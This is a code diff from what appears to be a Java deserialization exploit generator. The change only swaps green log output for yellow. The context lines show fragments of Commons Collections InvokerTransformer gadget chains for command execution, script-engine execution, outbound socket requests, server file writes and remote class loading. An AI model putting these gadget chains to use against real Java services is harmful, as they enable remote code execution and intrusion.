@@ -34,7 +34,7 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
     public Transformer[] runtime(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
-        Printer.greenInfo("command: " + command);
+        Printer.yellowInfo("command: " + command);
 
         return new Transformer[]{
                 new ConstantTransformer(Runtime.class),
@@ -59,11 +59,11 @@ public class InvokerTransformer3 {
     public Transformer[] processBuilder(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
         EnchantEnums os = sinksHelper.getOs();
-        Printer.greenInfo("command: " + command);
+        Printer.yellowInfo("command: " + command);
 
         Transformer[] transformers = new Transformer[0];
         if (os != null && os.equals(EnchantEnums.WIN)) {
-            Printer.greenInfo("os: " + os);
+            Printer.yellowInfo("os: " + os);
             transformers = new Transformer[]{
                     new ConstantTransformer(ProcessBuilder.class),
                     new InvokerTransformer("getDeclaredConstructor", new Class[]{
@@ -116,7 +116,7 @@ public class InvokerTransformer3 {
         // 模板替换 -cmd -> [ppp]
         code = code.replaceAll("\\[ppp\\]", command);
 
-        Printer.greenInfo(String.format("js code is: %s", code));
+        Printer.yellowInfo(String.format("js code is: %s", code));
 
         return new Transformer[]{
                 new ConstantTransformer(ScriptEngineManager.class),
@@ -139,7 +139,7 @@ public class InvokerTransformer3 {
         EnchantEnums delay = sinksHelper.getDelay();
         Long delayTime = sinksHelper.getDelayTime();
 
-        Printer.greenInfo(String.format("System will delay response for %s seconds", delayTime));
+        Printer.yellowInfo(String.format("System will delay response for %s seconds", delayTime));
 
         Transformer[] transformers = null;
         if (delay != null && delay.equals(EnchantEnums.Timeunit)) {
@@ -178,7 +178,7 @@ public class InvokerTransformer3 {
     public Transformer[] socket(SinksHelper sinksHelper) {
         String thost = sinksHelper.getHost();
 
-        Printer.greenInfo("System will initiate a socket request to " + thost);
+        Printer.yellowInfo("System will initiate a socket request to " + thost);
 
         String[] hostSplit = thost.split("[:]");
         String host = hostSplit[0];
@@ -204,12 +204,12 @@ public class InvokerTransformer3 {
         String serverFilePath = sinksHelper.getServerFilePath();
         String localFilePath = sinksHelper.getLocalFilePath();
         String fileContent = sinksHelper.getFileContent();
-        Printer.greenInfo("Server file path: " + serverFilePath);
+        Printer.yellowInfo("Server file path: " + serverFilePath);
 
         byte[] contentBytes = new byte[]{};
 
         if (localFilePath != null) {
-            Printer.greenInfo("Local file path: " + localFilePath);
+            Printer.yellowInfo("Local file path: " + localFilePath);
             try {
                 FileInputStream fileInputStream = new FileInputStream(localFilePath);
                 contentBytes = new byte[fileInputStream.available()];
@@ -245,14 +245,14 @@ public class InvokerTransformer3 {
         String remoteClassName = sinksHelper.getRemoteClassName();
         Object constructor = sinksHelper.getConstructor();
 
-        Printer.greenInfo("Remote url: " + url);
-        Printer.greenInfo("Remote class name: " + remoteClassName);
+        Printer.yellowInfo("Remote url: " + url);
+        Printer.yellowInfo("Remote class name: " + remoteClassName);
 
         Transformer[] transformers;
 
         // 构造方法
         if (constructor != null) {
-            Printer.greenInfo("Remote class constructor param: " + constructor);
+            Printer.yellowInfo("Remote class constructor param: " + constructor);
             // 转为 Integer
             try {
                 constructor = Integer.parseInt(constructor.toString());
@@ -320,7 +320,7 @@ public class InvokerTransformer3 {
 
         Transformer[] transformers;
         if (loadFunction != null && loadFunction.equals(EnchantEnums.RHINO)) {
-            Printer.greenInfo("Class load function is " + "org.mozilla.javascript.DefiningClassLoader");
+            Printer.yellowInfo("Class load function is " + "org.mozilla.javascript.DefiningClassLoader");
             /**
              * org.mozilla.javascript.DefiningClassLoader.defineClass()
              * 需要 org.mozilla:rhino 依赖
@@ -334,7 +334,7 @@ public class InvokerTransformer3 {
                     new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),
                     new ConstantTransformer(1)};
         } else {
-            Printer.greenInfo("Class load function is " + "javax.script.ScriptEngineManager");
+            Printer.yellowInfo("Class load function is " + "javax.script.ScriptEngineManager");
             /**
              * javax.script.ScriptEngineManager
              */
